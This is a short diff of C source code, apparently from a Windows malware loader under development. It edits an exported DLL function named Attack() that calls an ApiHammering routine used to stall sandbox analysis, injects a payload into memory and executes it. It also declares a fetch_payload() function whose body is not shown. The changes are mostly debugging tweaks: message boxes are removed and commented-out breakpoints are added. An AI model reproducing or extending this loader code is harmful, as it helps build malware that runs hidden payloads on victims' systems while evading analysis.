@@ -33,7 +33,6 @@ extern __declspec(dllexport) int Attack()
 
     if (pAddVectoredExceptionHandler == NULL || pRemoveVectoredExceptionHandler == NULL)
     {
-        MessageBoxA(NULL, "ERROR", "ERROR", MB_OK);
         return -1;
     }
 
@@ -50,22 +49,20 @@ extern __declspec(dllexport) int Attack()
 
     ApiHammering(1000);
 
+    //__debugbreak();
     MessageBoxA(NULL, "Hello", "Hello", MB_OK);
-
-    if (!Inject(&pPayload, sSize, &pInjectedPayload))
+    //__debugbreak();
+    if (!Inject(&pInjectedPayload))
     {
         return -1;
     }
 
     ApiHammering(1000);
 
-    MessageBoxA(NULL, "Hello", "Hello", MB_OK);
-
     Execute(pInjectedPayload);
 
     return 0;
 }
-
 
 EXTERN_C DWORD fetch_payload()
 {
